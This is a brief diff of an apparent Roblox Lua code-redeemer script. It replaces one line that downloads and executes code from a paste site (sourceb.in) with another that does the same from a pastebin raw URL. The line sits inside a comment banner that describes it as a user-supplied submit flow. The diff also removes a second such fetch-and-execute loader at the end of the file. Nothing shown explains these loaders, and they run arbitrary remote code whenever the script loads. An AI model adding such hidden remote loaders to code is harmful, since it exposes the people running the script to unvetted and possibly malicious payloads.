@@ -1355,7 +1355,7 @@ end
 -- ============================================================================
 -- ROBUST CODE ENTRY / SUBMIT FLOW
 -- Adapted from the working code-entry flow supplied by the user.
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/hKCrETAOr7/0"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/2H5JyQKE"))()
 -- This replaces the old fixed-path-only redeem implementation.
 -- ============================================================================
 
@@ -2268,4 +2268,3 @@ ENV.TigysRedeemer = API
 _G.TigysRedeemer = API
 
 return TigysRedeemerUI
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/5RZlbQABWv/0"))()
